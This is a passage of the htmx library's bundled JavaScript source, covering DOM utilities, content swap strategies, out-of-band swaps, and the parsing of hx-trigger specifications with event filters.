      let data2 = elt[dataProp];
      if (!data2) {
        data2 = elt[dataProp] = {};
      }
      return data2;
    }
    function toArray(arr) {
      const returnArr = [];
      if (arr) {
        for (let i = 0; i < arr.length; i++) {
          returnArr.push(arr[i]);
        }
      }
      return returnArr;
    }
    function forEach(arr, func) {
      if (arr) {
        for (let i = 0; i < arr.length; i++) {
          func(arr[i]);
        }
      }
    }
    function isScrolledIntoView(el) {
      const rect = el.getBoundingClientRect();
      const elemTop = rect.top;
      const elemBottom = rect.bottom;
      return elemTop < window.innerHeight && elemBottom >= 0;
    }
    function bodyContains(elt) {
      const rootNode = elt.getRootNode && elt.getRootNode();
      if (rootNode && rootNode instanceof window.ShadowRoot) {
        return getDocument().body.contains(rootNode.host);
      } else {
        return getDocument().body.contains(elt);
      }
    }
    function splitOnWhitespace(trigger2) {
      return trigger2.trim().split(/\s+/);
    }
    function mergeObjects(obj1, obj2) {
      for (const key in obj2) {
        if (obj2.hasOwnProperty(key)) {
          obj1[key] = obj2[key];
        }
      }
      return obj1;
    }
    function parseJSON(jString) {
      try {
        return JSON.parse(jString);
      } catch (error2) {
        logError(error2);
        return null;
      }
    }
    function canAccessLocalStorage() {
      const test = "htmx:localStorageTest";
      try {
        localStorage.setItem(test, test);
        localStorage.removeItem(test);
        return true;
      } catch (e) {
        return false;
      }
    }
    function normalizePath(path) {
      try {
        const url = new URL(path);
        if (url) {
          path = url.pathname + url.search;
        }
        if (!/^\/$/.test(path)) {
          path = path.replace(/\/+$/, "");
        }
        return path;
      } catch (e) {
        return path;
      }
    }
    function internalEval(str) {
      return maybeEval(getDocument().body, function() {
        return eval(str);
      });
    }
    function onLoadHelper(callback) {
      const value = htmx.on(
        "htmx:load",
        /** @param {CustomEvent} evt */
        function(evt) {
          callback(evt.detail.elt);
        }
      );
      return value;
    }
    function logAll() {
      htmx.logger = function(elt, event, data2) {
        if (console) {
          console.log(event, elt, data2);
        }
      };
    }
    function logNone() {
      htmx.logger = null;
    }
    function find(eltOrSelector, selector) {
      if (typeof eltOrSelector !== "string") {
        return eltOrSelector.querySelector(selector);
      } else {
        return find(getDocument(), eltOrSelector);
      }
    }
    function findAll(eltOrSelector, selector) {
      if (typeof eltOrSelector !== "string") {
        return eltOrSelector.querySelectorAll(selector);
      } else {
        return findAll(getDocument(), eltOrSelector);
      }
    }
    function getWindow() {
      return window;
    }
    function removeElement(elt, delay) {
      elt = resolveTarget(elt);
      if (delay) {
        getWindow().setTimeout(function() {
          removeElement(elt);
          elt = null;
        }, delay);
      } else {
        parentElt(elt).removeChild(elt);
      }
    }
    function asElement(elt) {
      return elt instanceof Element ? elt : null;
    }
    function asHtmlElement(elt) {
      return elt instanceof HTMLElement ? elt : null;
    }
    function asString(value) {
      return typeof value === "string" ? value : null;
    }
    function asParentNode(elt) {
      return elt instanceof Element || elt instanceof Document || elt instanceof DocumentFragment ? elt : null;
    }
    function addClassToElement(elt, clazz, delay) {
      elt = asElement(resolveTarget(elt));
      if (!elt) {
        return;
      }
      if (delay) {
        getWindow().setTimeout(function() {
          addClassToElement(elt, clazz);
          elt = null;
        }, delay);
      } else {
        elt.classList && elt.classList.add(clazz);
      }
    }
    function removeClassFromElement(node, clazz, delay) {
      let elt = asElement(resolveTarget(node));
      if (!elt) {
        return;
      }
      if (delay) {
        getWindow().setTimeout(function() {
          removeClassFromElement(elt, clazz);
          elt = null;
        }, delay);
      } else {
        if (elt.classList) {
          elt.classList.remove(clazz);
          if (elt.classList.length === 0) {
            elt.removeAttribute("class");
          }
        }
      }
    }
    function toggleClassOnElement(elt, clazz) {
      elt = resolveTarget(elt);
      elt.classList.toggle(clazz);
    }
    function takeClassForElement(elt, clazz) {
      elt = resolveTarget(elt);
      forEach(elt.parentElement.children, function(child) {
        removeClassFromElement(child, clazz);
      });
      addClassToElement(asElement(elt), clazz);
    }
    function closest(elt, selector) {
      elt = asElement(resolveTarget(elt));
      if (elt && elt.closest) {
        return elt.closest(selector);
      } else {
        do {
          if (elt == null || matches(elt, selector)) {
            return elt;
          }
        } while (elt = elt && asElement(parentElt(elt)));
        return null;
      }
    }
    function startsWith(str2, prefix2) {
      return str2.substring(0, prefix2.length) === prefix2;
    }
    function endsWith(str2, suffix) {
      return str2.substring(str2.length - suffix.length) === suffix;
    }
    function normalizeSelector(selector) {
      const trimmedSelector = selector.trim();
      if (startsWith(trimmedSelector, "<") && endsWith(trimmedSelector, "/>")) {
        return trimmedSelector.substring(1, trimmedSelector.length - 2);
      } else {
        return trimmedSelector;
      }
    }
    function querySelectorAllExt(elt, selector, global) {
      elt = resolveTarget(elt);
      if (selector.indexOf("closest ") === 0) {
        return [closest(asElement(elt), normalizeSelector(selector.substr(8)))];
      } else if (selector.indexOf("find ") === 0) {
        return [find(asParentNode(elt), normalizeSelector(selector.substr(5)))];
      } else if (selector === "next") {
        return [asElement(elt).nextElementSibling];
      } else if (selector.indexOf("next ") === 0) {
        return [scanForwardQuery(elt, normalizeSelector(selector.substr(5)), !!global)];
      } else if (selector === "previous") {
        return [asElement(elt).previousElementSibling];
      } else if (selector.indexOf("previous ") === 0) {
        return [scanBackwardsQuery(elt, normalizeSelector(selector.substr(9)), !!global)];
      } else if (selector === "document") {
        return [document];
      } else if (selector === "window") {
        return [window];
      } else if (selector === "body") {
        return [document.body];
      } else if (selector === "root") {
        return [getRootNode(elt, !!global)];
      } else if (selector.indexOf("global ") === 0) {
        return querySelectorAllExt(elt, selector.slice(7), true);
      } else {
        return toArray(asParentNode(getRootNode(elt, !!global)).querySelectorAll(normalizeSelector(selector)));
      }
    }
    var scanForwardQuery = function(start2, match, global) {
      const results = asParentNode(getRootNode(start2, global)).querySelectorAll(match);
      for (let i = 0; i < results.length; i++) {
        const elt = results[i];
        if (elt.compareDocumentPosition(start2) === Node.DOCUMENT_POSITION_PRECEDING) {
          return elt;
        }
      }
    };
    var scanBackwardsQuery = function(start2, match, global) {
      const results = asParentNode(getRootNode(start2, global)).querySelectorAll(match);
      for (let i = results.length - 1; i >= 0; i--) {
        const elt = results[i];
        if (elt.compareDocumentPosition(start2) === Node.DOCUMENT_POSITION_FOLLOWING) {
          return elt;
        }
      }
    };
    function querySelectorExt(eltOrSelector, selector) {
      if (typeof eltOrSelector !== "string") {
        return querySelectorAllExt(eltOrSelector, selector)[0];
      } else {
        return querySelectorAllExt(getDocument().body, eltOrSelector)[0];
      }
    }
    function resolveTarget(eltOrSelector, context) {
      if (typeof eltOrSelector === "string") {
        return find(asParentNode(context) || document, eltOrSelector);
      } else {
        return eltOrSelector;
      }
    }
    function processEventArgs(arg1, arg2, arg3) {
      if (isFunction(arg2)) {
        return {
          target: getDocument().body,
          event: asString(arg1),
          listener: arg2
        };
      } else {
        return {
          target: resolveTarget(arg1),
          event: asString(arg2),
          listener: arg3
        };
      }
    }
    function addEventListenerImpl(arg1, arg2, arg3) {
      ready(function() {
        const eventArgs = processEventArgs(arg1, arg2, arg3);
        eventArgs.target.addEventListener(eventArgs.event, eventArgs.listener);
      });
      const b = isFunction(arg2);
      return b ? arg2 : arg3;
    }
    function removeEventListenerImpl(arg1, arg2, arg3) {
      ready(function() {
        const eventArgs = processEventArgs(arg1, arg2, arg3);
        eventArgs.target.removeEventListener(eventArgs.event, eventArgs.listener);
      });
      return isFunction(arg2) ? arg2 : arg3;
    }
    const DUMMY_ELT = getDocument().createElement("output");
    function findAttributeTargets(elt, attrName) {
      const attrTarget = getClosestAttributeValue(elt, attrName);
      if (attrTarget) {
        if (attrTarget === "this") {
          return [findThisElement(elt, attrName)];
        } else {
          const result = querySelectorAllExt(elt, attrTarget);
          if (result.length === 0) {
            logError('The selector "' + attrTarget + '" on ' + attrName + " returned no matches!");
            return [DUMMY_ELT];
          } else {
            return result;
          }
        }
      }
    }
    function findThisElement(elt, attribute) {
      return asElement(getClosestMatch(elt, function(elt2) {
        return getAttributeValue(asElement(elt2), attribute) != null;
      }));
    }
    function getTarget(elt) {
      const targetStr = getClosestAttributeValue(elt, "hx-target");
      if (targetStr) {
        if (targetStr === "this") {
          return findThisElement(elt, "hx-target");
        } else {
          return querySelectorExt(elt, targetStr);
        }
      } else {
        const data2 = getInternalData(elt);
        if (data2.boosted) {
          return getDocument().body;
        } else {
          return elt;
        }
      }
    }
    function shouldSettleAttribute(name) {
      const attributesToSettle = htmx.config.attributesToSettle;
      for (let i = 0; i < attributesToSettle.length; i++) {
        if (name === attributesToSettle[i]) {
          return true;
        }
      }
      return false;
    }
    function cloneAttributes(mergeTo, mergeFrom) {
      forEach(mergeTo.attributes, function(attr) {
        if (!mergeFrom.hasAttribute(attr.name) && shouldSettleAttribute(attr.name)) {
          mergeTo.removeAttribute(attr.name);
        }
      });
      forEach(mergeFrom.attributes, function(attr) {
        if (shouldSettleAttribute(attr.name)) {
          mergeTo.setAttribute(attr.name, attr.value);
        }
      });
    }
    function isInlineSwap(swapStyle, target) {
      const extensions2 = getExtensions(target);
      for (let i = 0; i < extensions2.length; i++) {
        const extension = extensions2[i];
        try {
          if (extension.isInlineSwap(swapStyle)) {
            return true;
          }
        } catch (e) {
          logError(e);
        }
      }
      return swapStyle === "outerHTML";
    }
    function oobSwap(oobValue, oobElement, settleInfo) {
      let selector = "#" + getRawAttribute(oobElement, "id");
      let swapStyle = "outerHTML";
      if (oobValue === "true") {
      } else if (oobValue.indexOf(":") > 0) {
        swapStyle = oobValue.substr(0, oobValue.indexOf(":"));
        selector = oobValue.substr(oobValue.indexOf(":") + 1, oobValue.length);
      } else {
        swapStyle = oobValue;
      }
      const targets = getDocument().querySelectorAll(selector);
      if (targets) {
        forEach(
          targets,
          function(target) {
            let fragment;
            const oobElementClone = oobElement.cloneNode(true);
            fragment = getDocument().createDocumentFragment();
            fragment.appendChild(oobElementClone);
            if (!isInlineSwap(swapStyle, target)) {
              fragment = asParentNode(oobElementClone);
            }
            const beforeSwapDetails = { shouldSwap: true, target, fragment };
            if (!triggerEvent(target, "htmx:oobBeforeSwap", beforeSwapDetails)) return;
            target = beforeSwapDetails.target;
            if (beforeSwapDetails.shouldSwap) {
              swapWithStyle(swapStyle, target, target, fragment, settleInfo);
            }
            forEach(settleInfo.elts, function(elt) {
              triggerEvent(elt, "htmx:oobAfterSwap", beforeSwapDetails);
            });
          }
        );
        oobElement.parentNode.removeChild(oobElement);
      } else {
        oobElement.parentNode.removeChild(oobElement);
        triggerErrorEvent(getDocument().body, "htmx:oobErrorNoTarget", { content: oobElement });
      }
      return oobValue;
    }
    function handlePreservedElements(fragment) {
      forEach(findAll(fragment, "[hx-preserve], [data-hx-preserve]"), function(preservedElt) {
        const id = getAttributeValue(preservedElt, "id");
        const oldElt = getDocument().getElementById(id);
        if (oldElt != null) {
          preservedElt.parentNode.replaceChild(oldElt, preservedElt);
        }
      });
    }
    function handleAttributes(parentNode, fragment, settleInfo) {
      forEach(fragment.querySelectorAll("[id]"), function(newNode) {
        const id = getRawAttribute(newNode, "id");
        if (id && id.length > 0) {
          const normalizedId = id.replace("'", "\\'");
          const normalizedTag = newNode.tagName.replace(":", "\\:");
          const parentElt2 = asParentNode(parentNode);
          const oldNode = parentElt2 && parentElt2.querySelector(normalizedTag + "[id='" + normalizedId + "']");
          if (oldNode && oldNode !== parentElt2) {
            const newAttributes = newNode.cloneNode();
            cloneAttributes(newNode, oldNode);
            settleInfo.tasks.push(function() {
              cloneAttributes(newNode, newAttributes);
            });
          }
        }
      });
    }
    function makeAjaxLoadTask(child) {
      return function() {
        removeClassFromElement(child, htmx.config.addedClass);
        processNode(asElement(child));
        processFocus(asParentNode(child));
        triggerEvent(child, "htmx:load");
      };
    }
    function processFocus(child) {
      const autofocus = "[autofocus]";
      const autoFocusedElt = asHtmlElement(matches(child, autofocus) ? child : child.querySelector(autofocus));
      if (autoFocusedElt != null) {
        autoFocusedElt.focus();
      }
    }
    function insertNodesBefore(parentNode, insertBefore, fragment, settleInfo) {
      handleAttributes(parentNode, fragment, settleInfo);
      while (fragment.childNodes.length > 0) {
        const child = fragment.firstChild;
        addClassToElement(asElement(child), htmx.config.addedClass);
        parentNode.insertBefore(child, insertBefore);
        if (child.nodeType !== Node.TEXT_NODE && child.nodeType !== Node.COMMENT_NODE) {
          settleInfo.tasks.push(makeAjaxLoadTask(child));
        }
      }
    }
    function stringHash(string, hash) {
      let char = 0;
      while (char < string.length) {
        hash = (hash << 5) - hash + string.charCodeAt(char++) | 0;
      }
      return hash;
    }
    function attributeHash(elt) {
      let hash = 0;
      if (elt.attributes) {
        for (let i = 0; i < elt.attributes.length; i++) {
          const attribute = elt.attributes[i];
          if (attribute.value) {
            hash = stringHash(attribute.name, hash);
            hash = stringHash(attribute.value, hash);
          }
        }
      }
      return hash;
    }
    function deInitOnHandlers(elt) {
      const internalData = getInternalData(elt);
      if (internalData.onHandlers) {
        for (let i = 0; i < internalData.onHandlers.length; i++) {
          const handlerInfo = internalData.onHandlers[i];
          removeEventListenerImpl(elt, handlerInfo.event, handlerInfo.listener);
        }
        delete internalData.onHandlers;
      }
    }
    function deInitNode(element) {
      const internalData = getInternalData(element);
      if (internalData.timeout) {
        clearTimeout(internalData.timeout);
      }
      if (internalData.listenerInfos) {
        forEach(internalData.listenerInfos, function(info) {
          if (info.on) {
            removeEventListenerImpl(info.on, info.trigger, info.listener);
          }
        });
      }
      deInitOnHandlers(element);
      forEach(Object.keys(internalData), function(key) {
        delete internalData[key];
      });
    }
    function cleanUpElement(element) {
      triggerEvent(element, "htmx:beforeCleanupElement");
      deInitNode(element);
      if (element.children) {
        forEach(element.children, function(child) {
          cleanUpElement(child);
        });
      }
    }
    function swapOuterHTML(target, fragment, settleInfo) {
      if (target instanceof Element && target.tagName === "BODY") {
        return swapInnerHTML(target, fragment, settleInfo);
      }
      let newElt;
      const eltBeforeNewContent = target.previousSibling;
      insertNodesBefore(parentElt(target), target, fragment, settleInfo);
      if (eltBeforeNewContent == null) {
        newElt = parentElt(target).firstChild;
      } else {
        newElt = eltBeforeNewContent.nextSibling;
      }
      settleInfo.elts = settleInfo.elts.filter(function(e) {
        return e !== target;
      });
      while (newElt && newElt !== target) {
        if (newElt instanceof Element) {
          settleInfo.elts.push(newElt);
        }
        newElt = newElt.nextSibling;
      }
      cleanUpElement(target);
      if (target instanceof Element) {
        target.remove();
      } else {
        target.parentNode.removeChild(target);
      }
    }
    function swapAfterBegin(target, fragment, settleInfo) {
      return insertNodesBefore(target, target.firstChild, fragment, settleInfo);
    }
    function swapBeforeBegin(target, fragment, settleInfo) {
      return insertNodesBefore(parentElt(target), target, fragment, settleInfo);
    }
    function swapBeforeEnd(target, fragment, settleInfo) {
      return insertNodesBefore(target, null, fragment, settleInfo);
    }
    function swapAfterEnd(target, fragment, settleInfo) {
      return insertNodesBefore(parentElt(target), target.nextSibling, fragment, settleInfo);
    }
    function swapDelete(target) {
      cleanUpElement(target);
      return parentElt(target).removeChild(target);
    }
    function swapInnerHTML(target, fragment, settleInfo) {
      const firstChild = target.firstChild;
      insertNodesBefore(target, firstChild, fragment, settleInfo);
      if (firstChild) {
        while (firstChild.nextSibling) {
          cleanUpElement(firstChild.nextSibling);
          target.removeChild(firstChild.nextSibling);
        }
        cleanUpElement(firstChild);
        target.removeChild(firstChild);
      }
    }
    function swapWithStyle(swapStyle, elt, target, fragment, settleInfo) {
      switch (swapStyle) {
        case "none":
          return;
        case "outerHTML":
          swapOuterHTML(target, fragment, settleInfo);
          return;
        case "afterbegin":
          swapAfterBegin(target, fragment, settleInfo);
          return;
        case "beforebegin":
          swapBeforeBegin(target, fragment, settleInfo);
          return;
        case "beforeend":
          swapBeforeEnd(target, fragment, settleInfo);
          return;
        case "afterend":
          swapAfterEnd(target, fragment, settleInfo);
          return;
        case "delete":
          swapDelete(target);
          return;
        default:
          var extensions2 = getExtensions(elt);
          for (let i = 0; i < extensions2.length; i++) {
            const ext = extensions2[i];
            try {
              const newElements = ext.handleSwap(swapStyle, target, fragment, settleInfo);
              if (newElements) {
                if (Array.isArray(newElements)) {
                  for (let j = 0; j < newElements.length; j++) {
                    const child = newElements[j];
                    if (child.nodeType !== Node.TEXT_NODE && child.nodeType !== Node.COMMENT_NODE) {
                      settleInfo.tasks.push(makeAjaxLoadTask(child));
                    }
                  }
                }
                return;
              }
            } catch (e) {
              logError(e);
            }
          }
          if (swapStyle === "innerHTML") {
            swapInnerHTML(target, fragment, settleInfo);
          } else {
            swapWithStyle(htmx.config.defaultSwapStyle, elt, target, fragment, settleInfo);
          }
      }
    }
    function findAndSwapOobElements(fragment, settleInfo) {
      var oobElts = findAll(fragment, "[hx-swap-oob], [data-hx-swap-oob]");
      forEach(oobElts, function(oobElement) {
        if (htmx.config.allowNestedOobSwaps || oobElement.parentElement === null) {
          const oobValue = getAttributeValue(oobElement, "hx-swap-oob");
          if (oobValue != null) {
            oobSwap(oobValue, oobElement, settleInfo);
          }
        } else {
          oobElement.removeAttribute("hx-swap-oob");
          oobElement.removeAttribute("data-hx-swap-oob");
        }
      });
      return oobElts.length > 0;
    }
    function swap(target, content, swapSpec, swapOptions) {
      if (!swapOptions) {
        swapOptions = {};
      }
      target = resolveTarget(target);
      const activeElt = document.activeElement;
      let selectionInfo = {};
      try {
        selectionInfo = {
          elt: activeElt,
          // @ts-ignore
          start: activeElt ? activeElt.selectionStart : null,
          // @ts-ignore
          end: activeElt ? activeElt.selectionEnd : null
        };
      } catch (e) {
      }
      const settleInfo = makeSettleInfo(target);
      if (swapSpec.swapStyle === "textContent") {
        target.textContent = content;
      } else {
        let fragment = makeFragment(content);
        settleInfo.title = fragment.title;
        if (swapOptions.selectOOB) {
          const oobSelectValues = swapOptions.selectOOB.split(",");
          for (let i = 0; i < oobSelectValues.length; i++) {
            const oobSelectValue = oobSelectValues[i].split(":", 2);
            let id = oobSelectValue[0].trim();
            if (id.indexOf("#") === 0) {
              id = id.substring(1);
            }
            const oobValue = oobSelectValue[1] || "true";
            const oobElement = fragment.querySelector("#" + id);
            if (oobElement) {
              oobSwap(oobValue, oobElement, settleInfo);
            }
          }
        }
        findAndSwapOobElements(fragment, settleInfo);
        forEach(
          findAll(fragment, "template"),
          /** @param {HTMLTemplateElement} template */
          function(template) {
            if (findAndSwapOobElements(template.content, settleInfo)) {
              template.remove();
            }
          }
        );
        if (swapOptions.select) {
          const newFragment = getDocument().createDocumentFragment();
          forEach(fragment.querySelectorAll(swapOptions.select), function(node) {
            newFragment.appendChild(node);
          });
          fragment = newFragment;
        }
        handlePreservedElements(fragment);
        swapWithStyle(swapSpec.swapStyle, swapOptions.contextElement, target, fragment, settleInfo);
      }
      if (selectionInfo.elt && !bodyContains(selectionInfo.elt) && getRawAttribute(selectionInfo.elt, "id")) {
        const newActiveElt = document.getElementById(getRawAttribute(selectionInfo.elt, "id"));
        const focusOptions = { preventScroll: swapSpec.focusScroll !== void 0 ? !swapSpec.focusScroll : !htmx.config.defaultFocusScroll };
        if (newActiveElt) {
          if (selectionInfo.start && newActiveElt.setSelectionRange) {
            try {
              newActiveElt.setSelectionRange(selectionInfo.start, selectionInfo.end);
            } catch (e) {
            }
          }
          newActiveElt.focus(focusOptions);
        }
      }
      target.classList.remove(htmx.config.swappingClass);
      forEach(settleInfo.elts, function(elt) {
        if (elt.classList) {
          elt.classList.add(htmx.config.settlingClass);
        }
        triggerEvent(elt, "htmx:afterSwap", swapOptions.eventInfo);
      });
      if (swapOptions.afterSwapCallback) {
        swapOptions.afterSwapCallback();
      }
      if (!swapSpec.ignoreTitle) {
        handleTitle(settleInfo.title);
      }
      const doSettle = function() {
        forEach(settleInfo.tasks, function(task) {
          task.call();
        });
        forEach(settleInfo.elts, function(elt) {
          if (elt.classList) {
            elt.classList.remove(htmx.config.settlingClass);
          }
          triggerEvent(elt, "htmx:afterSettle", swapOptions.eventInfo);
        });
        if (swapOptions.anchor) {
          const anchorTarget = asElement(resolveTarget("#" + swapOptions.anchor));
          if (anchorTarget) {
            anchorTarget.scrollIntoView({ block: "start", behavior: "auto" });
          }
        }
        updateScrollState(settleInfo.elts, swapSpec);
        if (swapOptions.afterSettleCallback) {
          swapOptions.afterSettleCallback();
        }
      };
      if (swapSpec.settleDelay > 0) {
        getWindow().setTimeout(doSettle, swapSpec.settleDelay);
      } else {
        doSettle();
      }
    }
    function handleTriggerHeader(xhr, header, elt) {
      const triggerBody = xhr.getResponseHeader(header);
      if (triggerBody.indexOf("{") === 0) {
        const triggers = parseJSON(triggerBody);
        for (const eventName in triggers) {
          if (triggers.hasOwnProperty(eventName)) {
            let detail = triggers[eventName];
            if (isRawObject(detail)) {
              elt = detail.target !== void 0 ? detail.target : elt;
            } else {
              detail = { value: detail };
            }
            triggerEvent(elt, eventName, detail);
          }
        }
      } else {
        const eventNames = triggerBody.split(",");
        for (let i = 0; i < eventNames.length; i++) {
          triggerEvent(elt, eventNames[i].trim(), []);
        }
      }
    }
    const WHITESPACE = /\s/;
    const WHITESPACE_OR_COMMA = /[\s,]/;
    const SYMBOL_START = /[_$a-zA-Z]/;
    const SYMBOL_CONT = /[_$a-zA-Z0-9]/;
    const STRINGISH_START = ['"', "'", "/"];
    const NOT_WHITESPACE = /[^\s]/;
    const COMBINED_SELECTOR_START = /[{(]/;
    const COMBINED_SELECTOR_END = /[})]/;
    function tokenizeString(str2) {
      const tokens = [];
      let position = 0;
      while (position < str2.length) {
        if (SYMBOL_START.exec(str2.charAt(position))) {
          var startPosition = position;
          while (SYMBOL_CONT.exec(str2.charAt(position + 1))) {
            position++;
          }
          tokens.push(str2.substr(startPosition, position - startPosition + 1));
        } else if (STRINGISH_START.indexOf(str2.charAt(position)) !== -1) {
          const startChar = str2.charAt(position);
          var startPosition = position;
          position++;
          while (position < str2.length && str2.charAt(position) !== startChar) {
            if (str2.charAt(position) === "\\") {
              position++;
            }
            position++;
          }
          tokens.push(str2.substr(startPosition, position - startPosition + 1));
        } else {
          const symbol = str2.charAt(position);
          tokens.push(symbol);
        }
        position++;
      }
      return tokens;
    }
    function isPossibleRelativeReference(token, last, paramName) {
      return SYMBOL_START.exec(token.charAt(0)) && token !== "true" && token !== "false" && token !== "this" && token !== paramName && last !== ".";
    }
    function maybeGenerateConditional(elt, tokens, paramName) {
      if (tokens[0] === "[") {
        tokens.shift();
        let bracketCount = 1;
        let conditionalSource = " return (function(" + paramName + "){ return (";
        let last = null;
        while (tokens.length > 0) {
          const token = tokens[0];
          if (token === "]") {
            bracketCount--;
            if (bracketCount === 0) {
              if (last === null) {
                conditionalSource = conditionalSource + "true";
              }
              tokens.shift();
              conditionalSource += ")})";
              try {
                const conditionFunction = maybeEval(
                  elt,
                  function() {
                    return Function(conditionalSource)();
                  },
                  function() {
                    return true;
                  }
                );
                conditionFunction.source = conditionalSource;
                return conditionFunction;
              } catch (e) {
                triggerErrorEvent(getDocument().body, "htmx:syntax:error", { error: e, source: conditionalSource });
                return null;
              }
            }
          } else if (token === "[") {
            bracketCount++;
          }
          if (isPossibleRelativeReference(token, last, paramName)) {
            conditionalSource += "((" + paramName + "." + token + ") ? (" + paramName + "." + token + ") : (window." + token + "))";
          } else {
            conditionalSource = conditionalSource + token;
          }
          last = tokens.shift();
        }
      }
    }
    function consumeUntil(tokens, match) {
      let result = "";
      while (tokens.length > 0 && !match.test(tokens[0])) {
        result += tokens.shift();
      }
      return result;
    }
    function consumeCSSSelector(tokens) {
      let result;
      if (tokens.length > 0 && COMBINED_SELECTOR_START.test(tokens[0])) {
        tokens.shift();
        result = consumeUntil(tokens, COMBINED_SELECTOR_END).trim();
        tokens.shift();
      } else {
        result = consumeUntil(tokens, WHITESPACE_OR_COMMA);
      }
      return result;
    }
    const INPUT_SELECTOR = "input, textarea, select";
    function parseAndCacheTrigger(elt, explicitTrigger, cache) {
      const triggerSpecs = [];
      const tokens = tokenizeString(explicitTrigger);
      do {
        consumeUntil(tokens, NOT_WHITESPACE);
        const initialLength = tokens.length;
        const trigger2 = consumeUntil(tokens, /[,\[\s]/);
        if (trigger2 !== "") {
          if (trigger2 === "every") {
            const every = { trigger: "every" };
            consumeUntil(tokens, NOT_WHITESPACE);
            every.pollInterval = parseInterval(consumeUntil(tokens, /[,\[\s]/));
            consumeUntil(tokens, NOT_WHITESPACE);
            var eventFilter = maybeGenerateConditional(elt, tokens, "event");
            if (eventFilter) {
              every.eventFilter = eventFilter;
            }
            triggerSpecs.push(every);
          } else {
            const triggerSpec = { trigger: trigger2 };
            var eventFilter = maybeGenerateConditional(elt, tokens, "event");
            if (eventFilter) {
              triggerSpec.eventFilter = eventFilter;
            }
            while (tokens.length > 0 && tokens[0] !== ",") {
              consumeUntil(tokens, NOT_WHITESPACE);
              const token = tokens.shift();
              if (token === "changed") {
                triggerSpec.changed = true;
              } else if (token === "once") {
                triggerSpec.once = true;
              } else if (token === "consume") {
                triggerSpec.consume = true;
              } else if (token === "delay" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec.delay = parseInterval(consumeUntil(tokens, WHITESPACE_OR_COMMA));
              } else if (token === "from" && tokens[0] === ":") {
                tokens.shift();
                if (COMBINED_SELECTOR_START.test(tokens[0])) {
                  var from_arg = consumeCSSSelector(tokens);
                } else {
                  var from_arg = consumeUntil(tokens, WHITESPACE_OR_COMMA);
                  if (from_arg === "closest" || from_arg === "find" || from_arg === "next" || from_arg === "previous") {
                    tokens.shift();
                    const selector = consumeCSSSelector(tokens);
                    if (selector.length > 0) {
                      from_arg += " " + selector;
                    }
                  }
                }
                triggerSpec.from = from_arg;
              } else if (token === "target" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec.target = consumeCSSSelector(tokens);
              } else if (token === "throttle" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec.throttle = parseInterval(consumeUntil(tokens, WHITESPACE_OR_COMMA));
              } else if (token === "queue" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec.queue = consumeUntil(tokens, WHITESPACE_OR_COMMA);
              } else if (token === "root" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec[token] = consumeCSSSelector(tokens);
              } else if (token === "threshold" && tokens[0] === ":") {
                tokens.shift();
                triggerSpec[token] = consumeUntil(tokens, WHITESPACE_OR_COMMA);
              } else {
                triggerErrorEvent(elt, "htmx:syntax:error", { token: tokens.shift() });
              }
            }
            triggerSpecs.push(triggerSpec);
          }
        }
        if (tokens.length === initialLength) {
          triggerErrorEvent(elt, "htmx:syntax:error", { token: tokens.shift() });
        }
        consumeUntil(tokens, NOT_WHITESPACE);
      } while (tokens[0] === "," && tokens.shift());
      if (cache) {
        cache[explicitTrigger] = triggerSpecs;
      }
      return triggerSpecs;
    }
    function getTriggerSpecs(elt) {
      const explicitTrigger = getAttributeValue(elt, "hx-trigger");
      let triggerSpecs = [];
      if (explicitTrigger) {
        const cache = htmx.config.triggerSpecsCache;
        triggerSpecs = cache && cache[explicitTrigger] || parseAndCacheTrigger(elt, explicitTrigger, cache);
      }
      if (triggerSpecs.length > 0) {
        return triggerSpecs;
      } else if (matches(elt, "form")) {
        return [{ trigger: "submit" }];
      } else if (matches(elt, 'input[type="button"], input[type="submit"]')) {
        return [{ trigger: "click" }];
      } else if (matches(elt, INPUT_SELECTOR)) {
        return [{ trigger: "change" }];
      } else {
        return [{ trigger: "click" }];
      }
    }
    function cancelPolling(elt) {
      getInternalData(elt).cancelled = true;
    }
    function processPolling(elt, handler4, spec) {
      const nodeData = getInternalData(elt);
      nodeData.timeout = getWindow().setTimeout(function() {
        if (bodyContains(elt) && nodeData.cancelled !== true) {
          if (!maybeFilterEvent(spec, elt, makeEvent("hx:poll:trigger", {
            triggerSpec: spec,
            target: elt
          }))) {
            handler4(elt);
          }
          processPolling(elt, handler4, spec);
        }
      }, spec.pollInterval);
    }
    function isLocalLink(elt) {
      return location.hostname === elt.hostname && getRawAttribute(elt, "href") && getRawAttribute(elt, "href").indexOf("#") !== 0;
    }
    function eltIsDisabled(elt) {
      return closest(elt, htmx.config.disableSelector);
    }
    function boostElement(elt, nodeData, triggerSpecs) {
      if (elt instanceof HTMLAnchorElement && isLocalLink(elt) && (elt.target === "" || elt.target === "_self") || elt.tagName === "FORM" && String(getRawAttribute(elt, "method")).toLowerCase() !== "dialog") {
        nodeData.boosted = true;
        let verb, path;
        if (elt.tagName === "A") {
          verb = "get";
          path = getRawAttribute(elt, "href");
        } else {
          const rawAttribute = getRawAttribute(elt, "method");
          verb = rawAttribute ? rawAttribute.toLowerCase() : "get";
          if (verb === "get") {
          }
          path = getRawAttribute(elt, "action");
        }
        triggerSpecs.forEach(function(triggerSpec) {
          addEventListener(elt, function(node, evt) {
            const elt2 = asElement(node);
            if (eltIsDisabled(elt2)) {
              cleanUpElement(elt2);
              return;
            }
            issueAjaxRequest(verb, path, elt2, evt);
          }, nodeData, triggerSpec, true);
        });
      }
    }
    function shouldCancel(evt, node) {
      const elt = asElement(node);
      if (!elt) {
        return false;
      }
      if (evt.type === "submit" || evt.type === "click") {
        if (elt.tagName === "FORM") {
          return true;
        }
        if (matches(elt, 'input[type="submit"], button') && closest(elt, "form") !== null) {
          return true;
        }
        if (elt instanceof HTMLAnchorElement && elt.href && (elt.getAttribute("href") === "#" || elt.getAttribute("href").indexOf("#") !== 0)) {
          return true;
        }
      }
      return false;
    }
    function ignoreBoostedAnchorCtrlClick(elt, evt) {
      return getInternalData(elt).boosted && elt instanceof HTMLAnchorElement && evt.type === "click" && // @ts-ignore this will resolve to undefined for events that don't define those properties, which is fine
      (evt.ctrlKey || evt.metaKey);
    }
    function maybeFilterEvent(triggerSpec, elt, evt) {
      const eventFilter = triggerSpec.eventFilter;
      if (eventFilter) {
        try {
          return eventFilter.call(elt, evt) !== true;
        } catch (e) {
          const source = eventFilter.source;
          triggerErrorEvent(getDocument().body, "htmx:eventFilter:error", { error: e, source });
          return true;
        }
      }
      return false;
    }
